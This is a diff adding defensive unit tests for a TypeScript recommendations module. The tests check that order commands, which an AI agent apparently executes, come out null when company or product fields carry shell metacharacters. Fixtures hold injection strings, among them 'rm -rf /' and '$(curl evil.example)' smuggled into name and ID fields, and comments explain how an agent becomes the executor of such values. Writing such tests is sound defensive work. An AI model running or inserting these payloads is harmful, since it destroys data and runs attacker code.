@@ -229,6 +229,117 @@ describe("getRecommendations", () => {
     expect(report.recommendations.some((r) => r.opportunityType === "Net-new")).toBe(true);
     expect(report.recommendations.some((r) => r.opportunityType === "Upsell")).toBe(true);
   });
+
+  // orderCommand is the agent's handle on a recommendation — CLAUDE.md and
+  // skill.md document "extract orderCommand from --json and run it." That
+  // makes the agent the unintentional executor of any value we interpolate
+  // into the string, so it must use a strict-identifier form and refuse to
+  // emit anything that could be parsed as a flag override by Commander
+  // after the REPL tokenizer re-splits it. The previous shape used the
+  // partner-facing display name (`--company "${companyName}"`), which broke
+  // out of its quote frame when the name contained a `"`.
+  describe("orderCommand is constructed from safe identifiers only", () => {
+    it("emits a quoted display name + safe argv for a non-UUID companyId", () => {
+      // #498's buildOrderArtifacts uses the display name (quoted) in the
+      // string form when companyId is not UUID-shaped, but the argv form
+      // (`orderArgs`) lands the value as a single argv element with no
+      // shell involvement. The companyName here ("Needs Backup") clears
+      // isSafeDisplayName — no shell metacharacters — so the artifacts
+      // are populated.
+      const subs = [
+        makeSub({ companyId: "c1", companyName: "Needs Backup" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find((r) => r.companyId === "c1" && r.title.includes("Datto"));
+      expect(rec).toBeDefined();
+      // Display string: quoted display name (companyId not UUID-shaped).
+      expect(rec!.orderCommand).toContain('--company "Needs Backup"');
+      // Safe argv form (#498): customer name as a single argv element,
+      // no quoting / escaping / shell involvement.
+      expect(rec!.orderArgs).toEqual([
+        "pax8",
+        "orders",
+        "create",
+        "--company",
+        "Needs Backup",
+        "--product",
+        "prod-bk",
+        "--quantity",
+        "50",
+      ]);
+    });
+
+    it("emits null orderCommand when companyId fails the safe-identifier check", () => {
+      // A malicious upstream that injected shell metacharacters into the
+      // companyId must not produce a usable orderCommand at all.
+      const subs = [
+        makeSub({ companyId: 'c1"; rm -rf /; "', companyName: "Evil Co" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find(
+        (r) => r.companyId === 'c1"; rm -rf /; "' && r.title.includes("Datto"),
+      );
+      expect(rec).toBeDefined();
+      expect(rec!.orderCommand).toBeNull();
+      // Parity: the safe argv form (#498) also collapses to null when the
+      // gate fails, so an agent that prefers `orderArgs` can't pick up
+      // a hostile companyId either.
+      expect(rec!.orderArgs).toBeNull();
+    });
+
+    it("emits null orderCommand when companyName has shell metacharacters", () => {
+      // The H-2 vector: a hostile API-supplied display name breaks out of
+      // the `--company "${name}"` quote frame, and the REPL tokenizer
+      // (which still consumes `orderCommand` as a string until consumers
+      // migrate to `orderArgs`) re-parses the resulting argv with
+      // attacker-controlled --product / --quantity overrides. The gate
+      // here collapses both forms to null on any unsafe name character.
+      const subs = [
+        makeSub({ companyId: "c1", companyName: 'Acme" $(curl evil.example) "' }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: "prod-bk", productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find((r) => r.companyId === "c1" && r.title.includes("Datto"));
+      expect(rec).toBeDefined();
+      expect(rec!.orderCommand).toBeNull();
+      expect(rec!.orderArgs).toBeNull();
+    });
+
+    it("emits null orderCommand when productId is not safe-identifier-shaped", () => {
+      // Demo fixture with a productId carrying shell metacharacters. Defense
+      // in depth even though the real Pax8 API only returns UUID-shaped IDs.
+      const subs = [
+        makeSub({ companyId: "c1", companyName: "Needs Backup" }),
+        makeSub({ companyId: "c2", companyName: "Has Backup" }),
+        makeSub({
+          companyId: "c2", companyName: "Has Backup",
+          productId: 'prod-bk" --extra "', productName: "Datto SaaS Protection", price: 5,
+        }),
+      ];
+      const report = getRecommendations(subs);
+      const rec = report.recommendations.find((r) => r.companyId === "c1" && r.title.includes("Datto"));
+      // The rec may still exist (peer product was found), but it can't
+      // produce a runnable command with that productId.
+      if (rec) {
+        expect(rec.orderCommand).toBeNull();
+        expect(rec.orderArgs).toBeNull();
+      }
+    });
+  });
 });
 
 describe("findUpsellCohort", () => {
